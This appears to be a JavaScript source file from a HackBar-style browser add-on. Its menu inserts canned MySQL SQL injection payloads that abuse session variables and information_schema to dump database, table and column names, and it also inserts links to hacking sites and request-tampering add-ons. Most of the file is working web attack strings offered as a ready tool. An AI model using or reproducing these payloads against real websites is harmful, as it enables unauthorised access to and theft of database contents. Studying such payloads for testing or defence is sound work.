HackBar.VM = {
	
	VariableMethod: function (choice)	{
		var str = choice;
		switch (str){
			case '1': txt = "(SELECT(@y)FROM(SELECT(@y:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.SCHEMATA)WHERE(SCHEMA_NAME!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)AND(0x00)IN(@y:=CONCAT(@y,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,schema_name,0x3c62723e))))y)";
					break;
			case '2': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.schemata)where(schema_name!=0x696e666f726d6174696f6e5f736368656d612e736368656d617461)and(@)in(@:=concat(@,@x:=@x%2b1))))x)";
					break;
			case '3': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.tables)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;			
			case '4': txt = "(select(@x)from(select(@:=0x3a),(@x:=0),(select(@)from(information_schema.columns)where(table_schema=database())and(@)in(@:=concat_ws(@,@x:=@x%2b1))))x)";
					break;
			case '5': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.tables)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
			case '6': txt = "(select(@r)from(select(@:=0x3a),(@r:=0),(select(@)from(information_schema.columns)where(table_schema!=database())and(@)in(@:=concat_ws(@,@r:=@r%2b1))))a)";
					break;
			case '7': txt = "http://anonpakforce.blogspot.com/";
					break;
			case '8': txt = "http://www.securityidiots.com/";
					break;
			case '9': txt = "https://addons.mozilla.org/en-US/firefox/addon/view-source/?src=api";
					break;
			case '10': txt = "https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/?src=search";
					break;
			case '11': txt = "https://addons.mozilla.org/en-US/firefox/addon/tamper-data/?src=search";
					break;
			case '12': txt = "https://addons.mozilla.org/en-US/firefox/addon/evil-verses-evil/";
					break;
		}	
		hackBar.setSelectedText( txt ); 
	  }

}